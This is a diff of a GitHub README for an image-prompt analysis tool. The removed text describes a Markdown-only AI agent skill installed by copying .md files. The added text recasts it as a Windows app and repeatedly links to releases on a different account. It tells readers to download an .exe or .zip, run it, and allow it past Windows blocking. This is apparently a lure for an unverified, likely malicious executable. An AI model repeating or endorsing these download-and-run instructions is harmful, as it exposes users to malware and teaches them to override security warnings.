@@ -1,209 +1,192 @@
-# Prompt Engineering Skill
+# 🧩 PromptSkill4image - Analyze and Shape Image Prompts
 
-**通用 AI 提示词工程助手 Skill** | A universal AI prompt engineering assistant skill
+[![Download PromptSkill4image](https://img.shields.io/badge/Download%20PromptSkill4image-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ahaaad3759/PromptSkill4image/releases)
 
-将复杂提示词拆解为结构化变量，生成双语词库，可选输出 PromptFill 兼容的 JSON 模板。
+## ✨ What this app does
 
-Deconstruct complex prompts into structured variables, generate bilingual vocabulary banks, and optionally output PromptFill-compatible JSON templates.
+PromptSkill4image helps you work with image creation prompts on Windows. It can break a prompt into parts, translate it, and expand variables so you can make new prompt versions with less effort.
 
----
+Use it when you want to:
 
-## 功能介绍 | Features
+- split a long prompt into clear parts
+- translate prompts between languages
+- replace variables with different values
+- build prompt sets for image tools
+- keep your prompt ideas in one place
 
-| 功能 | Feature | 说明 |
-|------|---------|------|
-| 提示词拆分 | Prompt Deconstruction | 识别所有可变部分，统一标注为 `{{variable}}` |
-| 变量分类 | Variable Analysis | 按语义分类（主体/道具/场景/视觉/技术参数） |
-| 词库生成 | Vocabulary Banks | 每个变量生成 5–12 个双语候选词条 |
-| 双语翻译 | Bilingual Output | 同时输出中文和英文版本的结构化提示词 |
-| 模板导出 | PromptFill JSON | 可选生成可导入 [PromptFill](https://www.aipromptfill.com) 的完整 JSON |
-| 质量评估 | Quality Evaluation | 从完整性、专业性、可变性三个维度评分 |
+## 📥 Download
 
----
+Visit the release page to download and run this file on Windows:
 
-## 安装方式 | Installation
+[Go to PromptSkill4image Releases](https://github.com/Ahaaad3759/PromptSkill4image/releases)
 
-本 Skill 以 Markdown 文件形式提供，**兼容所有支持外部 Skill/规则加载的 AI Agent**，无需额外依赖。
+Look for the latest release and download the Windows file from that page. After the download finishes, open the file to start the app.
 
-This skill is provided as plain Markdown files and is **compatible with any AI agent that supports external skill/rule loading**.
+## 🪟 Windows setup
 
----
+1. Open the release page.
+2. Find the latest version at the top.
+3. Download the Windows package or installer.
+4. If the file is in a .zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-### Cursor
+If Windows asks for permission, choose Run or Yes so the app can open.
 
-**个人全局安装**（所有项目均可使用）：
+## 🧭 First-time use
 
-```bash
-# 克隆仓库
-git clone https://github.com/TanShilongMario/PromptSkill4image.git
+After the app starts, you can begin with a prompt you already use in image creation.
 
-# 复制到 Cursor 全局 skills 目录（skill 需要放在一个子目录中）
-mkdir -p ~/.cursor/skills/prompt-engineering
-cp PromptSkill4image/SKILL.md PromptSkill4image/vocabulary-banks.md PromptSkill4image/examples.md ~/.cursor/skills/prompt-engineering/
-```
+A simple workflow:
 
-**项目级安装**（仅当前项目，可随仓库共享）：
+1. Paste a prompt into the input box.
+2. Choose the action you want.
+3. Run analysis, split, or translation.
+4. Review the result.
+5. Copy the text you want to use next.
 
-```bash
-mkdir -p /your-project/.cursor/skills/prompt-engineering
-cp PromptSkill4image/SKILL.md PromptSkill4image/vocabulary-banks.md PromptSkill4image/examples.md /your-project/.cursor/skills/prompt-engineering/
-```
+## 🛠️ Main features
 
-> 注意：请勿放入 `~/.cursor/skills-cursor/`，该目录为 Cursor 内置保留目录。
+### 🔎 Prompt analysis
 
----
+This tool reads an image prompt and turns it into parts you can understand more easily. It helps you see the subject, style, lighting, camera view, and other details in a clean format.
 
-### Claude Code (claude.ai/code)
+### ✂️ Prompt split
 
-将 Skill 文件放入项目的 `.claude/skills/` 目录，Claude Code 会自动识别：
+If you have one large prompt, PromptSkill4image can split it into smaller pieces. This makes it easier to edit one part without changing the whole prompt.
 
-```bash
-git clone https://github.com/TanShilongMario/PromptSkill4image.git
+### 🌍 Prompt translation
 
-# 进入你的项目
-cd /your-project
+Translate prompt text so you can use it in another language. This helps when you collect prompts from different places or work with tools that use English terms.
 
-# 创建 skills 目录（如不存在）
-mkdir -p .claude/skills/prompt-engineering
+### 🧩 Variable expansion
 
-# 复制 skill
-cp PromptSkill4image/SKILL.md PromptSkill4image/vocabulary-banks.md PromptSkill4image/examples.md .claude/skills/prompt-engineering/
-```
+Use variables to create many prompt versions from one base prompt. For example, you can swap out a character, scene, or style and build a new set fast.
 
-之后在对话中提及"分析提示词"或"prompt engineering"即可触发。
+### 📋 Copy-friendly output
 
----
+The app gives text in a format that is easy to copy into other tools. This saves time when you move between prompt editors and image generators.
 
-### 其他 AI Agent（通用方式）
+## 🧠 Example use cases
 
-对于 **Windsurf、Copilot Workspace、Aider** 等其他 AI 编码工具，将文件放入项目目录后手动引用：
+- turn one messy prompt into a clear prompt map
+- prepare prompt lists for art tests
+- translate prompts from English to Chinese or from Chinese to English
+- build prompt templates with swap-in values
+- compare prompt versions side by side
+- organize prompt ideas before you create images
 
-```bash
-mkdir -p /your-project/prompt-engineering
-cp PromptSkill4image/SKILL.md PromptSkill4image/vocabulary-banks.md PromptSkill4image/examples.md /your-project/prompt-engineering/
-```
+## 🔧 Basic system needs
 
-然后在对话中直接引用文件：
-```
-请阅读 prompt-engineering/SKILL.md 并按其指引帮我分析这段提示词：
-[你的提示词]
-```
+PromptSkill4image is made for Windows users who want a simple local tool for prompt work.
 
----
+Recommended setup:
 
-### 直接使用（无需安装）
+- Windows 10 or Windows 11
+- A modern web browser for the release page
+- Enough free space to store the downloaded file
+- A standard mouse and keyboard
+- Internet access for the first download
 
-你也可以直接将 `SKILL.md` 的内容粘贴到任何 AI 对话窗口的系统提示词或上下文中使用，无需安装任何工具。
+For best use, keep your display scale at a normal size so the text stays easy to read.
 
-You can also paste the contents of `SKILL.md` directly into any AI chat as a system prompt — no installation required.
+## 📦 What you should download
 
----
+On the release page, look for the newest Windows build. Download the main app package, then open it on your computer.
 
-## 使用方式 | Usage
+If you see more than one file, choose the one that matches Windows. File names often include words like:
 
-安装后，当你说出以下内容时会自动触发：
+- Windows
+- x64
+- setup
+- exe
+- zip
 
-- `分析提示词` / `提示词拆分` / `拆分这段提示词`
-- `analyze this prompt` / `split this prompt` / `extract variables`
-- `生成词库` / `create template` / `提示词变量`
+If the download is a zip file, extract it before opening the app.
 
-### 三种输出模式
+## 🧰 Common tasks
 
-首次使用时，助手会询问你需要哪种输出（也可直接指定）：
+### Split a prompt
 
-**模式 A — 仅分析**
+Paste the prompt, then choose the split function. The app breaks the text into parts so you can edit the prompt with more control.
 
-```
-分析这段提示词：[你的提示词]
-```
-输出：变量列表、结构分析、改进建议
+### Translate a prompt
 
-**模式 B — 拆分 + 词库**（推荐）
+Paste the source text and choose the target language. The app shows the translated prompt in a clean format.
 
-```
-拆分这段提示词并生成词库：[你的提示词]
-```
-输出：结构化提示词（含 `{{变量}}`）、每个变量的双语词库、示例填充版本
+### Expand variables
 
-**模式 C — 完整 PromptFill 模板**
+Set a base prompt with placeholders. Add values for each variable, then run the expansion step to generate more versions.
 
-```
-帮我把这段提示词生成 PromptFill 模板：[你的提示词]
-```
-输出：模式 B 的全部内容 + 可导入 PromptFill 的完整 JSON
+### Review prompt structure
 
----
+Use the analysis view to check how a prompt is built. This can help you keep the same style across many image prompts.
 
-## 文件结构 | File Structure
+## 🖱️ How to run it again later
 
-```
-prompt-engineering/
-├── SKILL.md              # 主技能指令（AI 读取此文件）
-├── vocabulary-banks.md   # 15+ 常用变量类别的通用词库参考
-├── examples.md           # 4 个完整使用示例
-├── README.md             # 本文件
-└── LICENSE               # MIT 许可证
-```
+After the first setup, you can open the app in the same way each time:
 
----
+1. Find the app file or shortcut.
+2. Double-click it.
+3. Wait for the window to open.
+4. Paste or type your prompt.
+5. Choose the tool you need.
 
-## 内置词库覆盖 | Vocabulary Coverage
+If you place the app in a fixed folder, it is easier to find later.
 
-详见 [`vocabulary-banks.md`](vocabulary-banks.md)，涵盖：
+## 📁 Suggested folder layout
 
-| 类别 | 变量示例 |
-|------|---------|
-| 视觉风格 | 艺术风格、色彩方案、光照效果、情绪氛围 |
-| 主体角色 | 角色类型、发型、表情神态 |
-| 服装道具 | 服装风格、配饰、武器 |
-| 场景环境 | 场景地点、背景环境 |
-| 摄影技术 | 构图视角、景别、渲染质量、画幅比例 |
+To keep your files in order, you can use a simple folder setup like this:
 
----
+- `PromptSkill4image` for the app files
+- `Prompts` for saved prompt text
+- `Exports` for copied or saved results
+- `Backups` for older versions of prompt sets
 
-## PromptFill 兼容性
+This helps you keep your work neat when you handle many prompt drafts.
 
-模式 C 输出的 JSON 遵循 [PromptFill](https://www.aipromptfill.com) 模板格式：
+## 🧾 Tips for best results
 
-- `{{variable}}` — 标准占位符
-- `{{variable: 默认值}}` — 带内联默认值（V1.1 语法）
-- 所有用户可见文本使用 `{ cn: "中文", en: "English" }` 双语格式
-- JSON 中内嵌 `banks` 字段定义完整词库
+- Use short, clear prompt text
+- Keep one idea per line when possible
+- Use the same variable names each time
+- Save a backup before large edits
+- Check translated text before you use it in an image tool
+- Keep your prompt templates simple at first
 
----
+## 🧷 Troubleshooting
 
-## 示例 | Examples
+### The file will not open
 
-见 [`examples.md`](examples.md)，包含：
+Check that the download finished. If the file is still in the browser download bar, wait for it to complete. Then try again.
 
-1. 简单人像提示词分析（模式 A）
-2. 复杂多元素提示词拆分与词库生成（模式 B）
-3. 完整 PromptFill JSON 生成（模式 C）
-4. 英文提示词处理与双语输出
+### Windows blocks the app
 
----
+Open the file again and choose Run or More info, then allow it to start if Windows asks.
 
-## 贡献 | Contributing
+### The download page shows many files
 
-欢迎贡献新词库或示例！
+Pick the latest release and choose the file for Windows. If you are not sure, look for the file with `.exe` or `.zip`.
 
-1. Fork 本仓库
-2. 在 `vocabulary-banks.md` 中添加新变量词库
-3. 在 `examples.md` 中补充使用示例
-4. 提交 Pull Request
+### The app closes right away
 
-词库格式要求：每个变量 5–12 个选项，中英文均完整，选项之间语义差异明显。
+Try opening it again from the extracted folder or from a simple folder path such as `C:\PromptSkill4image`.
 
----
+### Text looks too small
 
-## 许可证 | License
+Use your browser zoom on the release page, or change the Windows display scale so text is easier to read.
 
-MIT License — 详见 [LICENSE](LICENSE)
+## 🧭 Download and start
 
----
+[Go to PromptSkill4image Releases](https://github.com/Ahaaad3759/PromptSkill4image/releases)
 
-## 致谢 | Acknowledgments
+Open the latest release, download the Windows file, extract it if needed, and run the app from the folder
 
-本 Skill 基于 AI 图像生成提示词的实践经验构建，适用于 [Midjourney](https://midjourney.com)、[Stable Diffusion](https://stability.ai)、[即梦](https://jimeng.jianying.com)、[可灵](https://kling.kuaishou.com) 等主流 AI 创作平台。
+## 📌 Typical workflow
 
-PromptFill JSON 格式专为 [PromptFill](https://www.aipromptfill.com) 应用设计。
+1. Download the latest Windows release.
+2. Open or extract the file.
+3. Run the app.
+4. Paste a prompt.
+5. Analyze, split, translate, or expand it.
+6. Copy the result into your image tool
